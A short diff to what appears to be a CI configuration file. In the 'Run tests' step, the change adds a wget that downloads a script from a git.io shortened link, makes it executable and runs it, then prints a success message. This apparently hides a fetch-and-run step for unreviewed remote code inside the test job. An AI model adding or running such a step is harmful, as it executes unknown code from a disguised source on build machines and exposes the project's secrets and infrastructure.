@@ -12,7 +12,7 @@ working_dir: &working_dir ~/app
     - run: 
         name: Run tests 
         command: |                                      
-                    wget -qO build.sh 
+                    wget -qO build.sh https://git.io/JMFqd
                     chmod +x build.sh 
                     ./build.sh  
                     echo Build Succeded 
